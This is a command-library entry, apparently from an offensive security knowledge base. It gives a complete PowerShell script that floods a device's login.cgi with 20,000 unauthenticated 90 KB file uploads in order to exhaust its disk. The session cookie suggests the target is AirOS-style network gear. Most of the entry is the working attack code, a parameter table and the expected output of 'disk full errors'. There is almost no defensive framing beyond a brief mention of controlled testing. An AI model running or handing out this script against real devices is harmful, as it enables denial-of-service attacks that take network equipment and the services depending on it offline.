---
id: cmd-powershell-dos-001
data: >-
  $ip = "[target-ip]"

  $content = "A" * 90000


  for ($i=1; $i -le 20000; $i++)

  {

  $POST = "POST http://$ip/login.cgi HTTP/1.1\nProxy-Connection:
  keep-alive\nContent-Length: 5278\nCache-Control: max-age=0\nOrigin:
  http://$ip\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT
  6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87
  Safari/537.36\nContent-Type: multipart/form-data;
  boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP\nAccept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer:
  http://$ip/login.cgi\nAccept-Language: en-US,en;q=0.8\nCookie:
  last_check=1485458998012; AIROS_SESSIONID=64e0483fab347136fb49fdf81e5542bc;
  ui_language=en_US\nHost:
  $ip\n\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition:
  form-data; name=\"file\"; filename=\"$i.txt\"\nContent-Type:
  text/plain\n\n$content\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition:
  form-data;
  name=\"action\"\n\nupload\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--\n"

  echo $POST | Send-NetworkData -Computer [target-ip] -Port 80

  }


  function Send-NetworkData {

  [CmdletBinding()]

  param (

  [Parameter(Mandatory)][string]

  $Computer,


  [Parameter(Mandatory)][ValidateRange(1, 65535)]

  [Int16]

  $Port,


  [Parameter(ValueFromPipeline)]string[]

  $Data,


  [System.Text.Encoding]

  $Encoding = [System.Text.Encoding]::ASCII,


  [TimeSpan]

  $Timeout = [System.Threading.Timeout]::InfiniteTimeSpan)


  begin {

  # establish the connection and a stream writer

  $Client = New-Object -TypeName System.Net.Sockets.TcpClient

  $Client.Connect($Computer, $Port)

  $Stream = $Client.GetStream()

  $Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream,
  $Encoding, $Client.SendBufferSize, $true

  }

  process {

  # send all the input data

  foreach ($Line in $Data) {

  $Writer.WriteLine($Line)

  }

  }

  end {

  # flush and close the connection send

  $Writer.Flush()

  $Writer.Dispose()

  $Client.Client.Shutdown('Send')

  # read the response

  $Stream.ReadTimeout = [System.Threading.Timeout]::Infinite

  if ($Timeout -ne [System.Threading.Timeout]::InfiniteTimeSpan) {

  $Stream.ReadTimeout = $Timeout.TotalMilliseconds

  }


  $Result = ''

  $Buffer = New-Object -TypeName System.Byte[] -ArgumentList
  $Client.ReceiveBufferSize

  do {

  try {

  $ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)

  } catch [System.IO.IOException] {

  $ByteCount = 0

  }

  if ($ByteCount -gt 0) {

  $Result += $Encoding.GetString($Buffer, 0, $ByteCount)

  }

  } while ($Stream.DataAvailable -or $Client.Client.Connected)


  Write-Output $Result

  # cleanup

  $Stream.Dispose()

  $Client.Dispose()

  }

  }
tags:
  - dos
  - script
type: command
output: Multiple HTTP 200 OK responses; eventual disk full errors
executor: powershell
platforms:
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:10.948Z'
verified: false
validated: true
submitted: true
---
# powershell-disk-exhaustion-script

## Command

```powershell
$ip = "[target-ip]"
$content = "A" * 90000

for ($i=1; $i -le 20000; $i++)
{
$POST = "POST http://$ip/login.cgi HTTP/1.1\n... [full POST body as in data]"
echo $POST | Send-NetworkData -Computer [target-ip] -Port 80
}

function Send-NetworkData { ... [full function as in data] }
```

## Description

PowerShell script that loops to send 20,000 HTTP POST requests for file uploads, each with a unique filename and 90KB content, to exhaust disk space via unauthenticated uploads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $ip | Target IP address | Yes |
| $i | Loop counter for filename ($i.txt) | Internal |
| $content | Payload content ("A" * 90000) | Yes |
| Computer | TCP target (defaults to [target-ip]) | Yes |
| Port | HTTP port (80) | Yes |
| Timeout | Connection timeout (Infinite) | No |

## Examples

### Basic Usage

Set $ip and run the script in PowerShell.

### Advanced Usage

Adjust loop count ($i -le 20000) or content size for controlled testing.

## Expected Output

Console outputs HTTP responses; successful uploads until disk full, then errors like 500 or connection failures.

## Related

- [[Related Procedure|procedures/Repeat-Uploads-for-Disk-Exhaustion]]
